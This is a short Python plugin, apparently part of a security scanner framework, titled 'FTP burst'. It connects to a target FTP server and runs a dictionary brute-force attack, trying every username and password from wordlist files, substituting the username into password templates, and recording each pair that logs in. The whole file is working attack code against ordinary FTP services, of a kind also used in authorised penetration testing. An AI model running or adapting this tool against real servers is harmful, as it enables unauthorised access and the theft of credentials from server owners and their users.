#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

import ftplib

def info(data=None):
    info = {
        "name": "FTP burst",
        "info": "FTP burst.",
        "level": "high",
        "type": "unauth",
    }
    return info

def prove(data):
    data = init(data, 'ftp')
    ftp = ftplib.FTP()
    try:
        ftp.connect(data['target_host'], data['target_port'])
        ftp.quit()
    except Exception as e:
        return data
    usernamedic = _read_dic(data['dic_one']) if 'dic_one' in data.keys() else  _read_dic('dict/ftp_usernames.txt')
    passworddic = _read_dic(data['dic_two']) if 'dic_two' in data.keys() else  _read_dic('dict/ftp_passwords.txt')
    anonymous = False
    for linef1 in usernamedic:
        username = linef1.strip('\r').strip('\n')
        for linef2 in passworddic:
            try:
                if username == 'anonymous':
                    if anonymous:
                        continue
                    else:
                        anonymous = True
                password = (
                    linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                    '\r').strip('\n')
                ftp.connect(data['target_host'], data['target_port'])
                ftp.login(username, password)
                data['flag'] = 1
                data['data'].append({"username": username, "password": password})
                data['res'].append({"info": username + "/" + password, "key": ftp.getwelcome()})
                ftp.quit()
            except Exception as e:
                pass
    return data


def _read_dic(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()